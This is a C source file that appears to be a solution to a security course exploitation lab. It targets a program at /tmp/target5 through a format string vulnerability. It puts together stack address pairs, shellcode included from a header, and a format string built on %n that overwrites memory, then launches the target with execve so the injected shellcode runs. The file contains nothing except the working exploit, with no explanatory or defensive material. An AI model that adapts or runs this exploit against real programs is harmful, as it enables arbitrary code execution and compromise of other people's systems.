#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define EGG_SIZE 400 

int main(void)
{
  char *args[3];
  char *env[1];
  char egg[EGG_SIZE];
  char *popStack = "%x%x%x";
  char *dummyAddrPair = "\xff\xff\xff\xff\xcc\xfd\xff\xbf\xff\xff\xff\xff\xcd\xfd\xff\xbf\xff\xff\xff\xff\xce\xfd\xff\xbf\xff\xff\xff\xff\xcf\xfd\xff\xbf";
  char *writeStr = "%x%x%x%250x%n%164x%n%259x%n%192x%n";

  memset (egg, 0, sizeof (egg));  
  memcpy (egg, dummyAddrPair, strlen (dummyAddrPair));
  memcpy (egg + strlen (dummyAddrPair), shellcode, strlen (shellcode));
  memcpy (egg + strlen (dummyAddrPair) + strlen (shellcode), writeStr, strlen (writeStr));

  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;  

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
